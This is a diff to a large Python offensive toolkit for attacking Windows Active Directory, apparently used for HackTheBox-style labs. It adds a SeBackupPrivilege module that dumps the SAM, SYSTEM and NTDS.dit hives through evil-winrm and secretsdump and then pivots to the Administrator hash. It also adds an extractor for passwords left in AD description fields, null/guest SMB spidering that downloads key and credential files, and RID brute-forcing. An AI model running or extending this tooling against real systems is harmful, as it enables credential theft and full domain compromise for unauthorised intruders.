@@ -189,7 +189,7 @@ def _attack_map():
     C1     = '\033[38;2;0;180;210m'
     cols   = shutil.get_terminal_size((120, 24)).columns
 
-    nodes = _SESSION_RESULTS[-8:]
+    nodes = _SESSION_RESULTS[-12:]
     n     = len(nodes)
     if n == 0: return ''
 
@@ -1154,12 +1154,50 @@ except Exception:
 _SESSION_RESULTS = []
 _RESULTS_MAX     = 5
 
-def add_result(module, detail, status='ok'):
-    """Record a one-line finding — same module replaces previous entry."""
+# modules that should append rather than replace (each entry is meaningful)
+_MULTI_RESULT_MODULES = {'spray','shares','hashcrack','bloody','nxcmodules','enum','backupabuse','zipslip','certipy'}
+
+def _session_state_path():
+    """Path to session state file for current workspace."""
+    if TARGET and TARGET.loot_dir:
+        ws_dir = os.path.dirname(TARGET.loot_dir)  # loot_dir is workspace/loot/
+        return os.path.join(ws_dir, 'session_state.json')
+    return None
+
+def _save_session_state():
+    """Persist _SESSION_RESULTS to workspace file."""
+    path = _session_state_path()
+    if not path: return
+    try:
+        import json as _json_ss
+        os.makedirs(os.path.dirname(path), exist_ok=True)
+        with open(path, 'w') as f:
+            _json_ss.dump(_SESSION_RESULTS, f)
+    except Exception:
+        pass
+
+def _load_session_state():
+    """Restore _SESSION_RESULTS from workspace file."""
     global _SESSION_RESULTS
-    _SESSION_RESULTS = [r for r in _SESSION_RESULTS if r['module'] != module]
+    path = _session_state_path()
+    if not path or not os.path.exists(path): return
+    try:
+        import json as _json_ls
+        saved = _json_ls.loads(open(path).read())
+        if isinstance(saved, list) and saved:
+            _SESSION_RESULTS = saved
+            log(f'{GREEN}Session restored — {WHITE}{len(saved)}{RESET}{GREEN} chain steps loaded{RESET}','success')
+    except Exception:
+        pass
+
+def add_result(module, detail, status='ok'):
+    """Record a one-line finding. Multi-result modules append; others replace."""
+    global _SESSION_RESULTS
+    if module not in _MULTI_RESULT_MODULES:
+        _SESSION_RESULTS = [r for r in _SESSION_RESULTS if r['module'] != module]
     _SESSION_RESULTS.append({'module': module, 'status': status, 'detail': detail})
-    # persist to DB
+    # persist to disk and DB
+    _save_session_state()
     ws = os.path.basename(TARGET.loot_dir) if TARGET.loot_dir else 'default'
     _db_save_finding(ws, TARGET.domain, module, detail, status)
 
@@ -1318,6 +1356,8 @@ class Enum(Module):
             _save_users(users, target.loot_dir, target.domain)
             log(f'Userlist: {WHITE}{os.path.join(target.loot_dir, "users.txt")}{RESET} — use for kerbrute/spray/asreproast','info')
             add_result('enum', f'{len(users)} users → users.txt')
+        # scan all output for passwords in descriptions
+        _scan_descriptions(all_lines, target.loot_dir, target.domain or '')
         hr()
 
 class LDAPEnum(Module):
@@ -4403,13 +4443,19 @@ class ShareSpider(Module):
             if target.hash:       nxc_auth += ['-H',target.hash]
             elif target.password: nxc_auth += ['-p',target.password]
         else:
-            # null / guest session
+            # try null session first, fall back to guest automatically
             nxc_auth = ['-u','','-p','']
+            _null_test = run_cmd_capture([nxc,'smb',t_host,'-u','','-p','','--shares'],
+                                         label='null session test')[1]
+            if any('ACCESS_DENIED' in l or 'SESSION_DELETED' in l for l in _null_test):
+                log(f'{ORANGE}Null session denied — using guest{RESET}','warn')
+                nxc_auth = ['-u','guest','-p','']
 
         # interesting file extensions and patterns
         INTERESTING_EXT = {'.xlsx','.xls','.xlsm','.docx','.doc','.kdbx','.kdb',
                            '.pfx','.p12','.pem','.key','.ppk','.rdp','.ovpn',
-                           '.config','.conf','.cfg','.ini','.env','.xml','.yaml','.yml'}
+                           '.config','.conf','.cfg','.ini','.env','.xml','.yaml','.yml',
+                           '.ps1','.bat','.cmd','.sh','.txt','.log','.bak','.old','.zip'}
         INTERESTING_NAMES = {'password','passwd','cred','secret','backup','id_rsa',
                              'id_ed25519','authorized_keys','web.config','wp-config',
                              'appsettings','database','connection','ntds','shadow'}
@@ -4445,7 +4491,13 @@ class ShareSpider(Module):
             return False
 
         if mode == 'list':
-            run_cmd([nxc,'smb',t_host]+nxc_auth+['--shares'], label='netexec shares')
+            rc, lines = run_cmd_capture([nxc,'smb',t_host]+nxc_auth+['--shares'], label='netexec shares')
+            # fallback to guest if null session denied
+            if rc != 0 or all('ACCESS_DENIED' in l or 'SESSION_DELETED' in l for l in lines if 'Error' in l):
+                denied = any('ACCESS_DENIED' in l or 'SESSION_DELETED' in l for l in lines)
+                if denied and not target.user:
+                    log(f'{ORANGE}Null session denied — retrying with guest{RESET}','warn')
+                    run_cmd([nxc,'smb',t_host,'-u','guest','-p','','--shares'], label='netexec shares (guest)')
 
         elif mode == 'spider':
             share   = self.ask('share to spider','')
@@ -4487,34 +4539,84 @@ class ShareSpider(Module):
                             if sname and sname not in ('ADMIN$','IPC$','print$'):
                                 shares.append(sname)
             shares = list(dict.fromkeys(shares))
+
+            # fallback 1: guest account if null session failed
+            if not shares and nxc_auth == ['-u','','-p','']:
+                log(f'{ORANGE}Null session denied — trying guest account{RESET}','warn')
+                guest_auth = ['-u','guest','-p','']
+                rc, share_lines = run_cmd_capture([nxc,'smb',t_host]+guest_auth+['--shares'],
+                                                  label='list shares (guest)')
+                for l in share_lines:
+                    if 'READ' in l or 'WRITE' in l:
+                        parts = l.split()
+                        for i,p in enumerate(parts):
+                            if p in ('READ','WRITE','READ,WRITE') and i > 0:
+                                sname = parts[i-1].strip()
+                                if sname and sname not in ('ADMIN$','IPC$','print$'):
+                                    shares.append(sname)
+                shares = list(dict.fromkeys(shares))
+                if shares:
+                    nxc_auth = guest_auth  # use guest for subsequent operations
+                    log(f'{GREEN}Guest session works{RESET}','success')
+
             if not shares:
-                log('No readable shares found','warn'); hr(); return
+                log('No readable shares found — try setting valid credentials','warn'); hr(); return
             share_list = ', '.join(shares)
             log(f'{GREEN}{len(shares)} readable share(s): {WHITE}{share_list}{RESET}','success')
 
-            # 2. spider_plus for file listing
-            spider_plus = check_tool('netexec','nxc','crackmapexec','cme')
+            # 2. use smbclient recursive listing to find all files
+            smbcl = check_tool('smbclient')
             downloaded = 0
             for share in shares:
                 log(f'Spidering {WHITE}{share}{RESET}...','info')
-                rc2, file_lines = run_cmd_capture(
-                    [nxc,'smb',t_host]+nxc_auth+
-                    ['--spider',share,'--depth','6',
-                     '--pattern',r'.+'],  # get all files
-                    label=f'spider {share}')
-                for l in file_lines:
-                    # parse netexec spider output: path lines
-                    if '\\\\' in l or '//' in l:
-                        # extract path
+                file_paths = []
+
+                if smbcl:
+                    # build smbclient auth
+                    if target.hash:
+                        smb_auth_args = [f'//{t_host}/{share}','-U',
+                            f'{target.domain}/{target.user}%{target.hash}','--pw-nt-hash','-c','recurse;ls']
+                    elif target.user and target.password:
+                        smb_auth_args = [f'//{t_host}/{share}','-U',
+                            f'{target.domain}/{target.user}%{target.password}','-c','recurse;ls']
+                    else:
+                        smb_auth_args = [f'//{t_host}/{share}','-U','guest%','-c','recurse;ls']
+                    rc2, smb_lines = run_cmd_capture([smbcl]+smb_auth_args, label=f'smbclient ls {share}')
+
+                    # parse smbclient recursive output
+                    current_dir = '\\'
+                    for l in smb_lines:
+                        # directory change: \subdir\
+                        dm = re.match(r'\s*\\(.*)\\\s*$', l)
+                        if dm:
+                            current_dir = '\\' + dm.group(1).rstrip('\\') + '\\'
+                            continue
+                        # file entry: filename  A  size  date
+                        fm = re.match(r'\s+(.+?)\s+[A-Z]+\s+(\d+)\s+', l)
+                        if fm:
+                            fname = fm.group(1).strip()
+                            if fname in ('.','..') or fname.startswith('.'):
+                                continue
+                            full_path = current_dir + fname
+                            file_paths.append(full_path)
+                else:
+                    # fallback: nxc spider with content flag
+                    rc2, file_lines = run_cmd_capture(
+                        [nxc,'smb',t_host]+nxc_auth+
+                        ['--spider',share,'--depth','6','--pattern',r'.+','--content'],
+                        label=f'spider {share}')
+                    for l in file_lines:
                         m = re.search(r'(?:\\\\|//)[^\s]+', l)
                         if m:
                             fpath = m.group(0).replace('\\\\','/').replace('//','/').lstrip('/')
-                            # strip share prefix
                             parts = fpath.split('/',1)
                             rel = parts[1] if len(parts) > 1 else parts[0]
-                            nt_path = '\\' + rel.replace('/','\\')
-                            if _auto_download(share, nt_path, target.loot_dir):
-                                downloaded += 1
+                            file_paths.append('\\' + rel.replace('/','\\'))
+
+                # download interesting files
+                for fpath in file_paths:
+                    if _auto_download(share, fpath, target.loot_dir):
+                        downloaded += 1
 
             log(f'{GREEN}{downloaded} interesting file(s) downloaded to {WHITE}{target.loot_dir}{RESET}','success')
             if downloaded:
@@ -5448,17 +5550,26 @@ class Nmap(Module):
         hr()
         # run silently — only show clean summary
         import subprocess as _sp_nmap
+        import time as _time_nmap
         spinner_chars = '⠋⠙⠹⠸⠼⠴⠦⠧⠇⠏'
         si = 0
+        _start_nmap = _time_nmap.time()
+        _open_count = 0
         proc = _sp_nmap.Popen(cmd, stdout=_sp_nmap.PIPE, stderr=_sp_nmap.STDOUT,
                                text=True, errors='replace')
         raw_lines = []
         for line in proc.stdout:
             raw_lines.append(line.rstrip())
-            sys.stdout.write(f'\r  {spinner_chars[si % len(spinner_chars)]} scanning {host}...   ')
+            if '/tcp' in line and 'open' in line:
+                _open_count += 1
+            _elapsed = int(_time_nmap.time() - _start_nmap)
+            _mins, _secs = divmod(_elapsed, 60)
+            _time_str = f'{_mins}m{_secs:02d}s' if _mins else f'{_secs}s'
+            _port_str = f'  {PINK}{_open_count} open{RESET}' if _open_count else ''
+            sys.stdout.write(f'\r  {spinner_chars[si % len(spinner_chars)]} scanning {host}  {GREY}{_time_str}{RESET}{_port_str}   ')
             sys.stdout.flush(); si += 1
         proc.wait()
-        sys.stdout.write('\r' + ' '*40 + '\r')
+        sys.stdout.write('\r' + ' '*60 + '\r')
         sys.stdout.flush()
 
         # write to file
@@ -5502,7 +5613,7 @@ class Nmap(Module):
                 if auto_mods:
                     log(f'{GREY}Auto-run suggestions? type module name or press enter to skip{RESET}','info')
                     for s in auto_mods[:3]:
-                        ans = input_field(f'run {C0}{s}{RESET}?','n',choices=['y','n'])
+                        ans = input_field(f'run {C0}{s}{RESET}? [y/n]','n')
                         if ans == 'y':
                             mod = MODULES.get(s)
                             if mod:
@@ -6106,6 +6217,127 @@ class JEA(Module):
         hr()
 
 # =============================================================================
+# BACKUPABUSE — SeBackupPrivilege → dump SAM/SYSTEM/NTDS → Administrator hash
+# =============================================================================
+class BackupAbuse(Module):
+    name='backupabuse'; description='SeBackupPrivilege abuse — dump SAM+SYSTEM or NTDS.dit via reg save / diskshadow'; category='exploitation'
+    def run(self, target):
+        if not self.req(target): return
+        hr()
+        mode = self.ask('mode','sam',['sam','ntds','check'])
+        hr()
+
+        ewrm   = check_tool('evil-winrm')
+        dc     = target.dc_fqdn or target.dc
+        loot   = target.loot_dir
+        os.makedirs(loot, exist_ok=True)
+
+        if mode == 'check':
+            log('Checking for SeBackupPrivilege via wmiexec...','info')
+            auth, extra = target.imp_str()
+            wmi = check_tool('impacket-wmiexec','wmiexec.py')
+            if wmi:
+                out = subprocess.check_output([wmi]+auth+extra+['whoami /priv'],
+                    stderr=subprocess.DEVNULL, text=True, errors='replace', timeout=10)
+                if 'SeBackupPrivilege' in out:
+                    log(f'{GREEN}SeBackupPrivilege is ENABLED — run backupabuse → sam or ntds{RESET}','success')
+                    add_result('backupabuse','SeBackupPrivilege confirmed')
+                else:
+                    log(f'{RED}SeBackupPrivilege not found{RESET}','error')
+            hr(); return
+
+        elif mode == 'sam':
+            log('SeBackupPrivilege → dump SAM + SYSTEM hives','info')
+            log(f'{ORANGE}Run these commands inside evil-winrm shell:{RESET}','warn')
+            log(f'  {C0}reg save HKLM\\SAM C:\\Windows\\Temp\\sam.bak{RESET}','info')
+            log(f'  {C0}reg save HKLM\\SYSTEM C:\\Windows\\Temp\\system.bak{RESET}','info')
+            log(f'  {C0}download C:\\Windows\\Temp\\sam.bak{RESET}','info')
+            log(f'  {C0}download C:\\Windows\\Temp\\system.bak{RESET}','info')
+            log(f'{PINK}Opening evil-winrm shell...{RESET}','info')
+            hr()
+
+            if ewrm:
+                if target.hash:
+                    cmd = [ewrm,'-i',dc,'-u',target.user,'-H',target.hash]
+                elif target.password:
+                    cmd = [ewrm,'-i',dc,'-u',target.user,'-p',target.password]
+                else:
+                    log('Set creds first','error'); hr(); return
+                pid = os.fork()
+                if pid == 0:
+                    os.execvp(cmd[0], cmd)
+                else:
+                    os.waitpid(pid, 0)
+
+            # after shell exits, check if files were downloaded
+            sam_path    = os.path.join(os.getcwd(), 'sam.bak')
+            system_path = os.path.join(os.getcwd(), 'system.bak')
+            # evil-winrm downloads to cwd
+            for f in ['sam.bak','system.bak']:
+                if os.path.exists(f):
+                    import shutil as _sh
+                    _sh.move(f, os.path.join(loot, f))
+                    log(f'{GREEN}Moved {f} → {loot}{RESET}','success')
+
+            sam    = os.path.join(loot,'sam.bak')
+            system = os.path.join(loot,'system.bak')
+            if os.path.exists(sam) and os.path.exists(system):
+                log('Dumping hashes from SAM + SYSTEM...','info')
+                sd = check_tool('impacket-secretsdump','secretsdump.py')
+                if sd:
+                    rc, lines = run_cmd_capture(
+                        [sd,'-sam',sam,'-system',system,'LOCAL'],
+                        label='secretsdump LOCAL')
+                    # parse Administrator hash
+                    for l in lines:
+                        if 'Administrator:' in l and ':::' in l:
+                            parts = l.split(':')
+                            if len(parts) >= 4:
+                                nt = parts[3].strip()
+                                log(f'{GREEN}Administrator NT: {WHITE}{nt}{RESET}','success')
+                                target.user = 'Administrator'
+                                target.hash = nt
+                                target.password = None
+                                TARGET.user = 'Administrator'
+                                TARGET.hash = nt
+                                TARGET.password = None
+                                with open(os.path.join(loot,'cracked.txt'),'a') as f:
+                                    f.write(f'Administrator:{nt}\n')
+                                add_result('backupabuse', f'Administrator hash: {nt[:8]}…')
+                                log(f'{GREEN}Pivoted to Administrator — run dcsync or exec{RESET}','success')
+                                break
+            else:
+                log(f'{ORANGE}sam.bak/system.bak not found in {loot} — download them inside the shell first{RESET}','warn')
+
+        elif mode == 'ntds':
+            log('SeBackupPrivilege → dump NTDS.dit via diskshadow','info')
+            log(f'{ORANGE}Run these commands inside evil-winrm shell:{RESET}','warn')
+            log(f'  {C0}diskshadow /s C:\\Windows\\Temp\\shadow.dsh{RESET}','info')
+            log(f'  Create shadow.dsh with:{RESET}','info')
+            log(f'    {C0}set context persistent nowriters{RESET}','info')
+            log(f'    {C0}add volume c: alias seg{RESET}','info')
+            log(f'    {C0}create{RESET}','info')
+            log(f'    {C0}expose %seg% z:{RESET}','info')
+            log(f'  Then copy: {C0}robocopy /b z:\\Windows\\NTDS . ntds.dit{RESET}','info')
+            log(f'  And: {C0}reg save HKLM\\SYSTEM C:\\Windows\\Temp\\system.bak{RESET}','info')
+            log(f'  Download both and run secretsdump','info')
+            hr()
+            if ewrm:
+                if target.password:
+                    cmd = [ewrm,'-i',dc,'-u',target.user,'-p',target.password]
+                elif target.hash:
+                    cmd = [ewrm,'-i',dc,'-u',target.user,'-H',target.hash]
+                else:
+                    log('Set creds first','error'); hr(); return
+                pid = os.fork()
+                if pid == 0:
+                    os.execvp(cmd[0], cmd)
+                else:
+                    os.waitpid(pid, 0)
+        hr()
+
+
+# =============================================================================
 # GODPOTATO — SeImpersonatePrivilege → SYSTEM via GodPotato
 # =============================================================================
 class GodPotato(Module):
@@ -6478,14 +6710,18 @@ class NXCModules(Module):
 
         ccache  = os.environ.get('KRB5CCNAME','')
         use_krb = ccache and os.path.exists(ccache)
+        # build auth-only args (no host)
         if use_krb:
-            nxc_smb  = [nxc,'smb', t_host,'-k','--use-kcache','-u',target.user or '']
-            nxc_ldap = [nxc,'ldap',t_host,'-k','--use-kcache','-u',target.user or '']
-            nxc_wmi  = [nxc,'wmi', t_host,'-k','--use-kcache','-u',target.user or '']
+            _auth = ['-k','--use-kcache','-u',target.user or '']
+        elif target.user and (target.password or target.hash):
+            _auth = ['-u',target.user,'-d',target.domain or 'WORKGROUP']
+            if target.hash:       _auth += ['-H',target.hash]
+            elif target.password: _auth += ['-p',target.password]
         else:
-            nxc_smb  = [nxc,'smb', t_host]+target.nxc_args()
-            nxc_ldap = [nxc,'ldap',target.dc]+target.nxc_args()
-            nxc_wmi  = [nxc,'wmi', t_host]+target.nxc_args()
+            _auth = ['-u','guest','-p','']
+        nxc_smb  = [nxc,'smb', t_host]+_auth
+        nxc_ldap = [nxc,'ldap',t_host]+_auth
+        nxc_wmi  = [nxc,'wmi', t_host]+_auth
 
         if action == 'menu':
             print(f'\n  {C0}Available actions:{RESET}')
@@ -6525,15 +6761,26 @@ class NXCModules(Module):
 
         elif action == 'rid':
             log('RID brute-force user enumeration','info')
-            start = self.ask('RID start','500')
-            end   = self.ask('RID end','2000')
-            run_cmd(nxc_smb+['--rid-brute',f'{start}-{end}'], label='nxc rid-brute')
+            end = self.ask('max RID','2000')
+            rc, lines = run_cmd_capture(nxc_smb+['--rid-brute', end], label='nxc rid-brute')
+            # save users to loot
+            users = []
+            for l in lines:
+                if 'SidTypeUser' in l and '\\' in l:
+                    m = re.search(r'\d+:\s+\S+\\(\S+)\s+\(SidTypeUser\)', l)
+                    if m: users.append(m.group(1))
+            if users:
+                ufile = os.path.join(target.loot_dir, 'users.txt')
+                with open(ufile,'w') as f: f.write('\n'.join(users)+'\n')
+                log(f'{GREEN}{len(users)} users saved → {WHITE}{ufile}{RESET}','success')
+                for u in users: print(f'  {C0}{u}{RESET}')
             add_result('nxcmodules','RID brute complete')
 
         elif action == 'users':
             log('Enumerate domain users via LDAP','info')
-            run_cmd(nxc_ldap+['--users'], label='nxc ldap users')
+            rc, lines = run_cmd_capture(nxc_ldap+['--users'], label='nxc ldap users')
             add_result('nxcmodules','users enumerated')
+            _scan_descriptions(lines, target.loot_dir, target.domain or '')
 
         elif action == 'spider_plus':
             log('spider_plus — maps all shares and downloads interesting files','info')
@@ -8900,7 +9147,7 @@ MODULES = {m.name: m for m in [
     Trusts, ACLPersist, DCShadow, SMBClient, DiamondTicket, SapphireTicket,
     Nmap, FFuf, Unauth, HashCrack, AddComputer, PassTheCert, GroupScope, JEA, GodPotato,
     PyWhisker, PKINIT, UnPAC, LDAPShell, CrossDomain,
-    NXCModules, NetEnum, OwnerEdit, PassiveSniff, Enrich, Timeroast, Coercion, ZipSlip,
+    NXCModules, NetEnum, OwnerEdit, PassiveSniff, Enrich, Timeroast, Coercion, ZipSlip, BackupAbuse,
     Ligolo, BloodHoundQuery, AutoEnum, RunasCs, KeePass, FTP,
     DPloot, SCCM, Pre2K, ADIDNS,
     SyncJacking, DNSAdmins, AzureADSync, LAPSToolkit, PywerView, HealthCheck,
@@ -8911,7 +9158,7 @@ GROUPS = {
     'recon':        ['enum','ldapenum','bloodyenum','kerbrute','enum4linux','rpcenum','gpp','adrecon','dnsdump','adidns','pathfind','shares','mssql','unauth','bh-query','autoenum','ftp','healthcheck','pywerview','nmap','ffuf','nxcmodules'],
     'credentials':  ['kerberoast','asreproast','spray','laps','lapstoolkit','gmsa','dpapi','dploot','hashcrack','unpac','timeroast','keepass','sccm','pre2k','azureadsync'],
     'lateral':      ['secretsdump','dcsync','pth','ptt','exec','bloody','smbclient','passthecert','jea','pkinit','ldapshell','ligolo','runasc'],
-    'exploitation': ['certipy','relay','mitm6','coerce','coercion','zerologon','nopac','spnjack','badsuccessor','addcomputer','groupscope','godpotato','pywhisker','crossdomain','zipslip',
+    'exploitation': ['certipy','relay','mitm6','coerce','coercion','zerologon','nopac','spnjack','badsuccessor','addcomputer','groupscope','godpotato','backupabuse','pywhisker','crossdomain','zipslip',
                      'golden','silver','diamond','sapphire','rbcd','shadowcred','trusts','printnightmare','rubeus',
                      'syncjacking','dnsadmins'],
     'persistence':  ['aclpersist','dcshadow'],
@@ -9175,6 +9422,43 @@ def _gen_report(target):
     except Exception:
         pass
     hr()
+
+
+def _scan_descriptions(lines, loot_dir, domain):
+    """Scan output lines for passwords hidden in AD description fields. Auto-saves hits."""
+    _pw_re = re.compile(
+        r'(?:password|passwd|pwd|pass)\s*(?:is|=|:)\s*(\S+)|'
+        r'([A-Za-z0-9]{2,}[@#$!*][A-Za-z0-9@#$!*&^%]{4,})',
+        re.IGNORECASE)
+    hits = []
+    for l in lines:
+        if not l.strip() or 'Description' in l: continue
+        # try to extract username:description pairs from nxc/ldeep output
+        # nxc format: PROTO  IP  PORT  DC  username  date  badpw  description...
+        parts = l.split()
+        if len(parts) < 6: continue
+        # find description start — after the badpw digit
+        desc_start = None
+        for i, p in enumerate(parts):
+            if i > 4 and p.isdigit():
+                desc_start = i + 1; break
+        if not desc_start: continue
+        desc = ' '.join(parts[desc_start:])
+        username = parts[4]
+        if not desc or username in ('Administrator','Guest','krbtgt'): continue
+        m = _pw_re.search(desc)
+        if m:
+            pw = (m.group(1) or m.group(2) or '').strip('.,;:')
+            if pw and len(pw) >= 6:
+                log(f'{PINK}🔑 Password in description — {WHITE}{username}{RESET}{PINK}: {WHITE}{pw}{RESET}','warn')
+                cracked = os.path.join(loot_dir,'cracked.txt')
+                with open(cracked,'a') as f: f.write(f'{username}:{pw}\n')
+                _db_save_cred(os.path.basename(loot_dir), domain, username, pw, source='description')
+                add_result('enum', f'cred in desc: {username}')
+                hits.append((username, pw))
+    if hits:
+        log(f'{GREEN}{len(hits)} credential(s) found in descriptions — saved to cracked.txt{RESET}','success')
+    return hits
 
 
 def _gen_password_patterns(passwords, loot_dir):
@@ -9733,15 +10017,35 @@ def set_target(target):
     if target.domain and target.dc:
         _write_krb5(target)
         log(f'Run {C0}clockskew{RESET} to detect and fix Kerberos clock offset before attacking','info')
-    # add DC fqdn to /etc/hosts so bloodhound-python can resolve without DNS
+    # add DC fqdn to /etc/hosts — update existing IP entry if present, avoid duplicates
     if target.dc_fqdn and target.dc:
         try:
-            hosts = open('/etc/hosts', errors='replace').read()
-            if target.dc_fqdn not in hosts:
-                entry = f'{target.dc}  {target.dc_fqdn}  {target.domain}'
-                subprocess.run(['sudo','-n','bash','-c',f'echo "{entry}" >> /etc/hosts'],
-                               stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-                log(f'Added {WHITE}{target.dc_fqdn}{RESET} → {WHITE}{target.dc}{RESET} to /etc/hosts','success')
+            lines = open('/etc/hosts', errors='replace').read().splitlines()
+            full_content = '\n'.join(lines)
+            if target.dc_fqdn not in full_content:
+                new_lines = []
+                updated = False
+                for l in lines:
+                    stripped = l.strip()
+                    if stripped.startswith(target.dc) and not stripped.startswith('#'):
+                        parts = stripped.split()
+                        if target.dc_fqdn not in parts:
+                            parts.insert(1, target.dc_fqdn)
+                        new_lines.append(' '.join(parts))
+                        updated = True
+                    else:
+                        new_lines.append(l)
+                if updated:
+                    new_content = '\n'.join(new_lines) + '\n'
+                    subprocess.run(['sudo','-n','tee','/etc/hosts'],
+                        input=new_content, text=True,
+                        stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+                    log(f'Updated /etc/hosts: {WHITE}{target.dc}  {target.dc_fqdn}{RESET}','success')
+                else:
+                    entry = f'{target.dc}  {target.dc_fqdn}  {target.domain}'
+                    subprocess.run(['sudo','-n','bash','-c',f'echo "{entry}" >> /etc/hosts'],
+                                   stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+                    log(f'Added {WHITE}{target.dc_fqdn}{RESET} → {WHITE}{target.dc}{RESET} to /etc/hosts','success')
             else:
                 log(f'{GREY}{target.dc_fqdn} already in /etc/hosts{RESET}','info')
         except Exception: pass
@@ -10236,6 +10540,8 @@ def load_workspace(name, target):
         if 'KRB5CCNAME' in os.environ: del os.environ['KRB5CCNAME']
         _auto_load_ccache(target)
         _write_krb5(target)
+        # restore session state (attack map)
+        _load_session_state()
         return True
     return False
 
@@ -10272,6 +10578,9 @@ def do_workspace(target):
         else:
             os.makedirs(_ws_path(name), exist_ok=True)
             log(f'Created workspace {WHITE}{name}{RESET} — run {C0}set{RESET} to configure target','success')
+            # clear session state for fresh start
+            global _SESSION_RESULTS
+            _SESSION_RESULTS = []
             if target.domain:
                 copy = input_field(f'copy current target ({target.domain}) into workspace?','y',['y','n'])
                 if copy == 'y':
@@ -11909,6 +12218,36 @@ def repl():
                 if _user_flag: parts.append(f'user:{_user_flag[:8]}…')
                 if _root_flag: parts.append(f'root:{_root_flag[:8]}…')
                 add_result('flag', '  '.join(parts))
+
+            # skull calling card when both flags found
+            if _root_flag and _user_flag:
+                _dom  = (TARGET.domain or 'UNKNOWN').upper()
+                _user = _user_flag
+                _root = _root_flag
+                _hash = f':{TARGET.hash}' if TARGET.hash else TARGET.password or '?'
+                print(f"""
+{C0}         _,.-----.,_{RESET}
+{C0}       ,-~           ~-.{RESET}
+{C0}      ,^___           ___^.{RESET}
+{C0}    /~\"   ~\"   .   \"~   \"~\\{RESET}     {WHITE}{BOLD}{_dom}{RESET} {GREY}— TURNED OVER{RESET}
+{C0}   Y  ,--._    I    _.--.  Y{RESET}     {GREY}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{RESET}
+{C0}    | Y     ~-. | ,-~     Y |{RESET}    {GREY}user  {RESET}{GREEN}{_user}{RESET}
+{C0}    | |        }}:{{        | |{RESET}    {GREY}root  {RESET}{GREEN}{_root}{RESET}
+{C0}    j l       / | \\       ! l{RESET}    {GREY}creds {RESET}{WHITE}{_hash}{RESET}
+{C0} .-~  (__,.--\" .^. \"--.,__)  ~-.{RESET}
+{C0}(           / / | \\ \\           ){RESET}
+{C0} \\.____,   ~  \\/\"\\/  ~   .____,/{RESET} {GREY}KEYS TO THE KINGDOM. CHEERS.{RESET}
+{C0}  ^.____                 ____.^{RESET}
+{C0}     | |T ~\\  !   !  /~ T| |{RESET}
+{C0}     | |l   _ _ _ _ _   !| |{RESET}
+{C0}     | l \\/V V V V V V\\/ j |{RESET}
+{C0}     l  \\ \\|_|_|_|_|_|/ /  !{RESET}
+{C0}      \\  \\[T T T T T TI/  /{RESET}
+{C0}       \\  `^-^-^-^-^-^'  /{RESET}
+{C0}        \\               /{RESET}       {BOLD}{C0}SEGFAULT.SOLUTIONS{RESET} {GREY}WAS HERE{RESET}
+{C0}         \\.           ,/{RESET}
+{C0}           \"^-.___,-^\"{RESET}
+""")
             hr()
         elif cmd == 'flags':
             hr()
@@ -12078,8 +12417,30 @@ def _load_spawn_state():
         fqdn   = s.get('fqdn','').strip()
         if not ip: return False
         TARGET.dc = ip
+
+        # ── auto-discover real domain via ldapsearch namingContexts ──────
+        try:
+            ldaps = check_tool('ldapsearch')
+            if ldaps:
+                out = subprocess.check_output(
+                    [ldaps,'-x','-H',f'ldap://{ip}','-s','base','namingContexts'],
+                    stderr=subprocess.DEVNULL, timeout=5, text=True, errors='replace')
+                for line in out.splitlines():
+                    if line.startswith('namingContexts: DC='):
+                        # parse DC=cicada,DC=htb → cicada.htb
+                        parts = [p.split('=')[1] for p in line.split(': ')[1].split(',')
+                                 if p.upper().startswith('DC=')]
+                        if parts:
+                            domain = '.'.join(parts)
+                            # also try to guess DC FQDN from DNS SRV
+                            fqdn = f'{name.upper()}-DC.{domain}'
+                            break
+        except Exception:
+            pass
+
         if domain: TARGET.domain = domain
         if fqdn:   TARGET.dc_fqdn = fqdn
+
         log(f'{GREEN}spawn.py state loaded:{RESET} {WHITE}{name}{RESET} @ {WHITE}{ip}{RESET}','success')
         if domain: log(f'  domain: {WHITE}{domain}{RESET}','info')
         if fqdn:   log(f'  fqdn:   {WHITE}{fqdn}{RESET}','info')
